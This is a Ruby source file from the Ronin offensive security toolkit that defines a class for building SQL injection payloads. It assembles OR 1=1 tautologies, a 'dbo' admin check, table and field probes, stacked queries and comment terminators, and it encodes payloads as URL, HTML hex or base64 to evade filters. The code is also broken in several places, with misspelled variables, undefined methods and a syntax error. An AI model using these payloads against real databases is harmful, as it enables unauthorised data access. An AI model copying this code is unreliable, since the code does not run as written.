#
# Ronin - A decentralized repository for the storage and sharing of computer
# security advisories, exploits and payloads.
#
# Copyright (c) 2007 Hal Brodigan (postmodern at users.sourceforge.net)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#

require 'code/sql/statement'
require 'code/sql/program'
require 'extensions/string'

module Ronin
  module Code
    module SQL
      class Injection < Statement

	def initialize(expr=[],style=Style.new,&block)
	  @expressions = expr.flatten

	  super(style,block)
	end

	def escape(var)
	  @escape = var
	end

	def escape_string(var)
	  @escaped = "#{var}'"
	end

	def inject(expr)
	  @expressions << expr
	end

	def inject_and(expr)
	  @expressions+=['AND',expr]
	end

	def inject_or(expr)
	  @expressions+=['OR',expr]
	end

	def inject_error(garbage='1')
	  @expressions << garbage
	end

	def exec_error
	  @expessions << "EXEC SP_ (OR EXEC XP_)"
	end

	def all_rows(var='1')
	  var = compile_data(var)

	  inject_or?("#{var}=#{var}")
	end

	def exact_rows(var='1')
	  var = compile_data(var)

	  inject_and?("#{var}=#{var}")
	end

	def running_admin?
	  inject_and?("USER_NAME() = 'dbo'")
	end

	def has_table?(table)
	  inject_or?(select_from(table,:fields => count, :from => table)==1)
	end

	def has_field?(field)
	  inject_or?(field.not_null?)
	end

	def uses_table?(table)
	  inject_or?(table.not_null?)
	end

	def expression(*exprs)
	  new_exprs = exprs.flatten.map { |expr| expr.to_s }
	  @expressions+=new_exprs
	  return new_exprs
	end

	def sql(*commands,&block)
	  @program = Program.new(commands,@style,&block)
	end

	def compile
	  escape_injection(inject_expression,inject_program)
	end

	def Injection.compile(*expr,&block)
	  Injection.new(*expr,&block).compile
	end

	def url_encode
	  compile.url_encode
	end

	def Injection.url_encode(*expr,&block)
	  Injection.new(*expr,&block).url_encode
	end

	def html_hex
	  compile.html_hex_encode
	end

	def Injection.html_hex(*expr,&block)
	  Injection.new(*expr,&block).html_hex
	end

	def html_dec
	  compile.html_dec_encode
	end

	def Injection.html_dec(*expr,&block)
	  Injection.new(*expr,&block).html_dec
	end

	def base64
	  compile.base64_encode
	end

	def Injection.base64(*expr,&block)
	  Injection.new(*expr,&block).base64
	end

	protected

	def inject_expression
	  compile_expr(@expresions).strip
	end

	def inject_program
	  return '' unless @program

	  if @style.multiline
	    return "\n#{@program.compile.strip}"
	  else
	    return "; #{@program.compile.strip}"
	  end
	end

	def escape_injection(*expr)
	  expr = expr.join

	  unless escaped.empty?
	    if expr[-1].chr=="'")
	      return escaped+expr.chop
	    else
	      return escaped+expr+' --'
	    end
	  else
	    return expr
	  end
	end

      end
    end
  end
end
